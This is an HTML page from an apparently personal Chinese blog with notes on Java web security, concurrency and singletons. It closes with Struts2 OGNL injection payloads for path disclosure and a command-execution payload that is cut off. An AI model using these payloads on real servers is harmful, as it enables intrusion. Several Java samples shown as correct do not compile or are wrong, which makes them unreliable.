@@ -1,0 +1,203 @@
+<!DOCTYPE html><html lang="cn" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Java咖啡馆 | RngAd33的网络安全笔记</title><link rel="icon" type="image/x-icon" href="/blog233.github.io/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/blog233.github.io/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/blog233.github.io/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/blog233.github.io/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/blog233.github.io/css/arknights.css"><style>@font-face {
+  font-family: Bender;
+  src: local('Bender'), url("/blog233.github.io/font/Bender.ttf"), url("/blog233.github.io/font/Bender.otf");
+}
+@font-face {
+  font-family: BenderLight;
+  src: local('BenderLight'), url("/blog233.github.io/font/BenderLight.ttf");
+}
+@font-face {
+  font-family: 'JetBrains Mono';
+  src: local('JetBrains Mono'), url('/blog233.github.io/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+</style><script>var config = {"root":"/blog233.github.io/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"复制"}}</script><link type="text/css" rel="stylesheet" href="/blog233.github.io/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+ menuSettings: {
+   zoom: "None"
+ },
+ showMathMenu: false,
+ jax: ["input/TeX","output/CommonHTML"],
+ extensions: ["tex2jax.js"],
+ TeX: {
+   extensions: ["AMSmath.js","AMSsymbols.js"],
+   equationNumbers: {
+     autoNumber: "AMS"
+   }
+ },
+ tex2jax: {
+   inlineMath: [["\\(", "\\)"]],
+   displayMath: [["\\[", "\\]"]]
+ }
+});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/blog233.github.io/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/blog233.github.io/font/BenderLight.woff2") format('woff2');
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/blog233.github.io/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+ --dark-background: url('/blog233.github.io/img/bg.webp');
+ --light-background: url('/blog233.github.io/img/bk.webp');
+ --theme-encrypt-confirm: '确认'
+}</style><script defer src="/blog233.github.io/js/arknights.js"></script><script defer src="/blog233.github.io/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
+window.mermaid = mermaid;
+code.paintMermaid();
+</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+  menuSettings: {
+    zoom: "None"
+  },
+  showMathMenu: false,
+  jax: ["input/TeX","output/CommonHTML"],
+  extensions: ["tex2jax.js"],
+  TeX: {
+    extensions: ["AMSmath.js","AMSsymbols.js"],
+    equationNumbers: {
+      autoNumber: "AMS"
+    }
+  },
+  tex2jax: {
+    inlineMath: [["\\(", "\\)"]],
+    displayMath: [["\\[", "\\]"]]
+  }
+});
+</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/blog233.github.io/lib/encrypt/hbe.js"></script><script async src="/blog233.github.io/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/blog233.github.io/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/blog233.github.io/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Java咖啡馆</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2025-01-10T06:29:10.802Z" id="date"> 2025-01-10</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2025-11-25T14:53:41.562Z" id="updated"> 2025-11-25</time></div></span></div></div><hr><div id="post-content"><p>安全无止境，继续前进吧！</p>
+<p>不得不说，凯尔希医生对知识的涉猎范围还挺广的，<br>除了丰富的医学知识储备和医疗经验，还有安全相关的知识……<br>嘎呜 ~ 我也要向她一样能够独当一面，才能带领罗德岛继续前行啊！<br>博士 ~ 先来点咖啡吧！<br>–by Mon3tr</p>
+<p class='item-img' data-src='/blog233.github.io/./img/128952859_p0.webp'><img src="/blog233.github.io/./img/128952859_p0.webp"></p>
+<p><strong>这个小板块可能更偏向开发技术，主要讲述 Java Web 开发过程的常见安全问题，以及解决这些问题的方法及相关原理</strong></p>
+<h1 id="安全传递"><a href="#安全传递" class="headerlink" title="安全传递"></a>安全传递</h1><p>身为<del>博士</del>开发者，CRUD大法是必备的基础开发技术，一切的CRUD都离不开基于用户的操作；<br>不过，你真的有注意到那些潜在的安全问题吗？</p>
+<h2 id="潜在问题"><a href="#潜在问题" class="headerlink" title="潜在问题"></a>潜在问题</h2><ol>
+<li><p>SQL注入<br>  黑客通过输入不合法的登录数据构造恶意SQL语句，如果没有设置校验方法对登录数据进行拦截过滤，非法操作将被执行，造成数据泄露、篡改等风险；</p>
+</li>
+<li><p>中间人攻击<br>  所有的网络请求都有可能被拦截。若存在中间人监听，密钥将会被截获（无论是否加密），黑客可以利用截获的密钥实施重放攻击以实现身份冒用（尤其是管理员账户）；<br>  <strong>可以说，所有的前端校验、前端加密、临时会话（cookie、session、token…）等都是不可靠的，不可依赖它们进行身份校验！</strong><br>  <del>BurpSuite真好用</del></p>
+</li>
+</ol>
+<h2 id="应对策略"><a href="#应对策略" class="headerlink" title="应对策略"></a>应对策略</h2><ol>
+<li><p>设置字符过滤<br>  对用户输入的信息进行字符校验。对于不同信息可以采用分级过滤策略：<br> (1) 对于用户名等涉及到构造查询条件的敏感用户信息，实行强校验（仅放行数字、字母、下划线等常规字符，防注入、截断、RCE）；<br> (2) 对于个人简介等不被用于构造查询条件的一般用户信息，实行弱校验（额外放行汉字以及部分特殊字符）；</p>
+</li>
+<li><p>信息保密<br>  (1) 数据加密<br> 服务端将所有敏感信息（密码、手机号等）先加密再存入数据库（密码仅存密文摘要），后续调用需解密；<br> <strong>请注意：手机号绝对不可以直接采用摘要算法计算摘要，因为手机号是纯数字信息且长度和取值范围固定，很容易通过碰撞获取到，应先加密再摘要</strong><br>  (2) 信息脱敏<br> 服务端向前端页面展示信息时，使用视图（VO）过滤敏感信息；后端传输查询结果时对敏感信息作脱敏处理；<br>  (3) 传输保护<br> 对于采用公钥密码机制的通信系统，通信双方传递消息之前，使用对方的公钥加密数据，收到数据后使用自己的私钥解密；</p>
+</li>
+<li><p>完整性校验<br> 采用对称加密算法（如 AES），通信双方事先约定密钥，利用该密钥加密请求信息，再对密文进行摘要生成消息认证码；<br>  用户将密文和认证码发送到服务端，服务端使用相同的摘要算法生成校验码，与用户发送的认证码进行比对，两者一致即可证明消息未被篡改；</p>
+</li>
+<li><p>身份认证<br>  确认消息来源，防伪造，防抵赖：<br>  (1) 基于公钥密码体系的单向认证<br> 通信双方采用非对称加密算法（如 RSA、ECC等）各自生成公钥与私钥，用户使用私钥对请求信息（或摘要）签名后发送给服务器，服务器收到请求信息后使用对方公钥验签，验证通过后与用户建立临时会话；<br>  (2) 基于挑战响应的单向 &#x2F; 双向认证<br> 通信双方事先约定一把共享密钥，客户端发起请求时，服务端向客户端发送一个随机数，客户端使用密钥加密随机数后发送给服务端，服务端以相同算法和密钥验算，两次计算结果一致则通过；<br>  (3) 设置验证码<br> 服务器向客户端发送验证码图片、行为验证弹窗等信息，客户端收集用户输入验证码或者行为轨迹后发送到服务器验证，由此限制爬虫机器人执行的操作；<br>  (4) 密钥对验证<br> 对于一些高安全需求的场景，在现有登录验证的基础上，服务端需要为每个用户发放两把密钥（accessKey, secretKey）以验证身份，其中 secretKey 仅用于构造签名，绝对不可以在网络上传输；</p>
+</li>
+<li><p>防重放<br>  从开发角度看，防御重放攻击主要有两种方式：<br>  (1) 添加一次性Token<br> 每次请求在发送时附带一个随机Token，值要足够大，用后需销毁（用过的Token存入缓存，在Token缓存过期之前不再接受相同的Token）；<br>  (2) 添加时间戳<br> 每次请求在发送时附带时间戳，后端需要对请求进行有效期验证，超时拒收；<br>  <strong>以上两种方法配合使用，在防重放的同时能够缓解后端缓存压力</strong></p>
+</li>
+<li><p>慎重使用网络代理<br>  在没有刚需的情况下，不要随意使用网络代理；即使一定要用，在没有确认代理方可靠之前，也不要执行任何涉及个人隐私的敏感操作，否则容易导致信息泄露、重放攻击等不良后果；<br>此外，有些网络代理商会对数据流量进行污染（如投放诈骗广告、钓鱼链接等）；</p>
+</li>
+</ol>
+<h2 id="大厂经验"><a href="#大厂经验" class="headerlink" title="大厂经验"></a>大厂经验</h2><ol>
+<li><p>以腾讯云为例：<br>服务器向用户发放密钥对&lt;SecretId, SecretKey&gt;用于登录云服务器等，其中 SecretKey 仅创建时向用户展示一次，后续无法再次查看；<br>用户必须妥善保管，如果忘记、意外丢失或泄露，就必须销毁整个密钥对并重新创建；</p>
+</li>
+<li><p>以Bilibili为例：<br>  (1) 前端向后端服务器请求获取一次性token、挑战响应码challenge、公钥publicKey（后端生成这些参数后发送到前端，同步存入NoSQL并设置有效期）；<br>  (2) 前端要求用户进行人机验证，验证通过后产生32位校验码validate（轨迹 + challenge + 私钥privateKey（浏览器内置）→ HMAC-SHA256 → Hex）和安全码seccode（validate + “|jordan”）；<br>  (3) 前端使用 privateKey 对 challenge 签名，将用户密码与 token、challenge签名、seccode 拼接形成明文，让浏览器通过 WebCrypto RSA-OAEP 算法使用 publicKey 加密明文，；<br>  (4) 将得到的密文、签名信息与请求获取到的验证信息打包发送给服务器；<br>  (5) 服务器验证有效性并使用私钥解密密文提取有效信息，验证challenge签名，验证通过后执行登录操作建立临时会话，同时废弃之前的所有一次性验证信息；</p>
+</li>
+</ol>
+<h1 id="Java并发编程"><a href="#Java并发编程" class="headerlink" title="Java并发编程"></a>Java并发编程</h1><p>身为<del>博士</del>开发者，你对Java并发编程应该不会陌生；<br>Java的高并发依赖于对线程的调教，能够更大程度地发挥CPU的效能，提高系统性能和吞吐量，适应处理海量数据和请求的需求；<br><strong>推荐一本《Java并发编程之美》，可以啃一啃，对需要处理高并发的开发者有不小的帮助。</strong></p>
+<h2 id="内存可见性问题"><a href="#内存可见性问题" class="headerlink" title="内存可见性问题"></a>内存可见性问题</h2><p>要研究这个问题，需要先了解多核CPU的系统架构和Java工作内存模型：<br class='item-img' data-src='/blog233.github.io/./img/OIP.webp'><img src="/blog233.github.io/./img/OIP.webp"> <img src="/blog233.github.io/./img/R.webp"><br>在多核CPU系统架构中，每一个内核都有自己的控制器、运算器和一级缓存，所有内核共享一个主内存（有些架构存在共享二级缓存）；<br>当某个线程需要处理共享变量时，先从主内存将共享变量复制到自己的工作缓存中，再对变量进行处理，处理完毕后刷新到主内存中；<br>当两个及以上个线程同时处理一个共享变量，且两级缓存均为空时，缓存的存在将会导致不同线程之间共享变量内存不可见；</p>
+<h3 id="synchronized关键字"><a href="#synchronized关键字" class="headerlink" title="synchronized关键字"></a>synchronized关键字</h3><p>synchronized是Java内置的一种原子锁，每个对象都可以将其当作同步锁使用；<br>此外，它还可以用来保证多操作的原子性，即所有操作要么都执行，要么都不执行（类似于数据库的事务）；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Entity</span> &#123;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> value;<br><br>  <span class="hljs-keyword">public</span> synchronised <span class="hljs-type">long</span> <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> value;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> synchronised <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(<span class="hljs-type">long</span> value)</span> &#123;<br>      <span class="hljs-built_in">this</span>.value = value;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="volatile关键字"><a href="#volatile关键字" class="headerlink" title="volatile关键字"></a>volatile关键字</h3><p>与synchronize不同，volatile是一种弱形式的同步关键字，它可以让线程写入变量时把值刷新到主内存中，从而确保变量的更新对其它线程立即可见；<br>但是volatile不具备原子性，不能解决改————写等原子性问题；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Entity</span> &#123;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">long</span> value;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> value;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(<span class="hljs-type">long</span> value)</span> &#123;<br>      <span class="hljs-built_in">this</span>.value = value;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="CAS操作"><a href="#CAS操作" class="headerlink" title="CAS操作"></a>CAS操作</h3><p>非阻塞式原子性操作，是Java原子类的底层依赖，能够避免传统锁机制导致的上下文切换开销；</p>
+<h2 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h2><p>数据库系统一般支持多用户同时访问数据库，在多线程中同时读写同一个共享资源且没有任何同步措施时，可能会发生数据存储不一致的问题，<br>其中包括修改丢失、不可重复读、读取到脏数据，或者是其它不可预见的bug；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Entity</span> &#123;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> value;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> value;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(<span class="hljs-type">long</span> value)</span> &#123;  <span class="hljs-comment">// 线程不安全！</span><br>      <span class="hljs-built_in">this</span>.value = value;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h3><p>经典设计模式之一，用于保证一个线程只有一个实例化对象可以调用；</p>
+<ol>
+<li>基于同步机制的懒汉式单例模式<br>实现了延迟初始化（懒加载），即在第一次使用时才创建实例，另外同步机制能够保证线程安全，<br>但每次调用getFlag()方法时都需要加锁，性能较低；<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Entity</span> &#123;<br>  <br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Entity entity;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-title function_">Entity</span><span class="hljs-params">()</span> &#123;&#125;   <span class="hljs-comment">// 私有构造函数，防止外部实例化破坏单例模式</span><br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> Entity <span class="hljs-title function_">getEntity</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (entity == <span class="hljs-literal">null</span>)&#123;<br>      entity = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entity</span>();<br>    &#125;<br>    <span class="hljs-keyword">return</span> entity;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
+<li>基于双检锁机制的懒汉式单例模式<br>相比于同步机制，双检锁机制避免了不必要的锁开销，是懒汉式单例模式的推荐实现方式；<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Entity</span> &#123;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> Entity entity;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-title function_">Entity</span><span class="hljs-params">()</span> &#123;&#125;   <span class="hljs-comment">// 私有构造函数，防止外部实例化破坏单例模式</span><br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Entity <span class="hljs-title function_">getEntity</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (entity == <span class="hljs-literal">null</span>) &#123;                 <span class="hljs-comment">// 一检</span><br>      <span class="hljs-keyword">synchronized</span> (Entity.class)   <span class="hljs-comment">// 加锁</span><br>      <span class="hljs-keyword">if</span> (entity == <span class="hljs-literal">null</span>) entity = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entity</span>();   <span class="hljs-comment">// 二检</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> entity;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
+<li>饿汉式单例模式<br>在类加载时就初始化实例，不存在线程安全问题，实现起来也很简单，<br>但缺点是实例在类加载时就会被创建，即使没有使用到也会占用资源，可能会产生额外开销；<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Entity</span> &#123;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">volatile</span> Entity entity;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-title function_">Entity</span><span class="hljs-params">()</span> &#123;&#125;   <span class="hljs-comment">// 私有构造函数，防止外部实例化破坏单例模式</span><br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Entity <span class="hljs-title function_">getEntity</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> entity;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
+<li>静态内部类<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Entity</span> &#123;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EntityHolder</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Entity</span> <span class="hljs-variable">ENTITY</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entity</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Entity <span class="hljs-title function_">getEntity</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> EntityHolder.ENTITY;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
+<li>枚举类<br>利用Java枚举的特性，确保只有一个实例存在；<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>  FLAG(<span class="hljs-string">&quot;flag&#123;************&#125;&quot;</span>);<br><br>  <span class="hljs-keyword">private</span> String flag;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getFlag</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>.flag = flag;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h2><p>CPU的资源分配采用时间片轮转策略；当某线程的时间片用完时，该线程会转换成就绪状态，将资源让给其它线程；<br>在切换线程上下文时，需要保存线程的执行现场（快照），恢复执行时读取快照恢复现场；<br>然而线程上下文切换时非常费时耗资源的，在日常开发中要尽可能避免上下文切换；</p>
+<h2 id="线程死锁"><a href="#线程死锁" class="headerlink" title="线程死锁"></a>线程死锁</h2><p>两个及以上的线程因为争夺资源而造成的相互等待现象，如果没有外力作用就会永远运行下去，造成程序卡死；</p>
+<h3 id="产生条件"><a href="#产生条件" class="headerlink" title="产生条件"></a>产生条件</h3><ol>
+<li><p>互斥条件<br>  线程已经获取到了资源，不允许其它线程同时占用，其它线程只能等待；</p>
+</li>
+<li><p>不可剥夺条件<br>  线程获取到的资源只能由当前占用的线程释放，不可被其它资源抢占；</p>
+</li>
+<li><ul>
+<li>请求并持有条件<br>一个线程已经获取到了资源却又申请获取其它资源，而其它资源已被其它线程占用；</li>
+</ul>
+</li>
+<li><ul>
+<li>环路等待条件<br>死锁发生时，必然存在一个线程————资源死循环；</li>
+</ul>
+</li>
+</ol>
+<p><strong>当以上四个条件同时出现时，死锁就产生了</strong></p>
+<h3 id="开锁方法"><a href="#开锁方法" class="headerlink" title="开锁方法"></a>开锁方法</h3><p>前两个产生条件无法避免，因为它们保证了线程的特性；当后两个条件同时出现时，破坏掉至少一个条件就可以打破死锁；</p>
+<h2 id="守护线程与用户进程"><a href="#守护线程与用户进程" class="headerlink" title="守护线程与用户进程"></a>守护线程与用户进程</h2><p>Java线程分为守护线程<code>daemon</code>和用户线程<code>user</code>两种线程，main()函数所在线程属于user线程；<br>两者之间的不同点在于：如果user线程没有全部结束，JVM就不会退出，而daemon线程是否结束不影响JVM退出；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 创建守护线程</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DaemonThread</span> &#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">Thread</span> <span class="hljs-variable">daemonThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 业务代码</span><br>      &#125;<br>    &#125;);<br>    <br>    <span class="hljs-comment">// 设置为守护线程</span><br>    daemonThread.setDaemon(<span class="hljs-literal">true</span>);<br>    daemonThread.start();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="ThreadLocal"><a href="#ThreadLocal" class="headerlink" title="ThreadLocal"></a>ThreadLocal</h2><p>由JDK提供的线程本地变量类；<br>每一个访问ThreadLocal变量的线程都会将变量复制到自己的本地内存，实际操作的是存在本地内存中的变量副本，避免了线程安全问题；</p>
+<h1 id="Struts2框架漏洞"><a href="#Struts2框架漏洞" class="headerlink" title="Struts2框架漏洞"></a>Struts2框架漏洞</h1><p>Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架；</p>
+<h2 id="OGNL表达式"><a href="#OGNL表达式" class="headerlink" title="OGNL表达式"></a>OGNL表达式</h2><p>‘%’在标志的属性为字符串类型时，计算OGNL表达式%{}中的值；<br>‘#’访问非根对象属性，因为Struts2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用；<br>‘$’在Struts2配置文件中，引用OGNL表达式；</p>
+<p>一些常用功能表达式：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取tomcat路径</span><br>%&#123;<span class="hljs-string">&quot;tomcatBinDir&#123;&quot;</span>+<span class="hljs-meta">@java</span>.lang.System<span class="hljs-meta">@getProperty(&quot;user.dir&quot;)</span>+<span class="hljs-string">&quot;&#125;&quot;</span>&#125;<br><br><span class="hljs-comment">// 获取web路径</span><br>%&#123;#req=<span class="hljs-meta">@org</span>.apache.struts2.ServletActionContext<span class="hljs-meta">@getRequest()</span>,#response=#context.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="hljs-string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()&#125;<br><br><span class="hljs-comment">// 命令执行</span><br>%&#123;#a=(<span class="hljs-keyword">new</span> <span class="hljs-title 